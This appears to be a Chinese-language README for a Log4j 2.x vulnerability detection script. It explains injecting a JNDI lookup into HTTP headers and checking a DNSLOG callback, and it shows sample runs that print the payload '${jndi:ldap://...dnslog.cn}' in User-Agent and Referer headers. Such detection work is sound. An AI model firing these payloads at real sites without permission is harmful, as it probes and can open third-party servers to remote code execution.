# Log4j-2.x-pythonscript

这是本人研究了一阵子之后写出来的脚本，一些网站使用Log4j，他会记录一些使用者的操作记录，也就是说只要是他能记录的功能就都有可能存在被注入的可能。
根据这种特性，笔者大胆猜测，绝大多数被记录的东西除了网站合法的搜索、表单的提交、登录等，那么是不是一些请求的User-agent/referer也会被记录下来呢？

经过测试，的确是这样的，一些存在此漏洞的网站的确也可以通过上述的方式进行构造注入的请求，那么一切就变得简单了起来。

整体思维如下：
1.访问DNSLOG平台，获取DNSLOG短域名
2.访问疑似存在漏洞的地址，将POC插入至user agent头中
3.提交请求，而后程序延迟60秒，因为dns回显会存在一定的延迟，这就导致如果立即请求回显页面，那么可能会看不到任何的回显，大多数存在漏洞的网站回显时间不会超过60秒
4.60秒之后查看DNS回显结果，若是成功，则会记录

使用方式
python -u 漏洞地址


E:\PyCharm 2020.1\new>python Log4j.py.py -u http://www.xxx.com/
+---------------------------------------------------------------+
+ [Log4j 2.x 漏洞检测工具]                                         +
+ [开发者：vlan911]                                               +
+ [使用方式: python Log4j.py -u/--url http://xxx.xxx.xxx.xxx]         +
+---------------------------------------------------------------+
3ocxzg.dnslog.cn
{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0${jndi:ldap://3ocxzg.dnslog.cn}', 'Cookie': 'addm90q6duunpj3vr4es815hl3', 'Referer': 'http
://www.xxx.com/{jndi:ldap://3ocxzg.dnslog.cn}'}
[["3ocxzg.dnslog.cn","*.*.*.*","2021-12-10 22:58:38"]]
[http://www.xxx.com/][===存在漏洞===]


E:\PyCharm 2020.1\new>python Log4j.py.py -u http://xxx.com
+---------------------------------------------------------------+
+ [Log4j 2.x 漏洞检测工具]                                      +
+ [开发者：vlan911]                                             +
+ [使用方式: python Log4j.py -u/--url http://xxx.xxx.xxx.xxx]   +
+---------------------------------------------------------------+
pwnm04.dnslog.cn
{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0${jndi:ldap://pwnm04.dnslog.cn}', 'Cookie': 'addm90q6duunpj3vr4es815hl3', 'Referer': 'http
://xxx.com{jndi:ldap://pwnm04.dnslog.cn}'}
[]
[http://xxx.com][不存在漏洞]


脚本请移步右侧的release下载

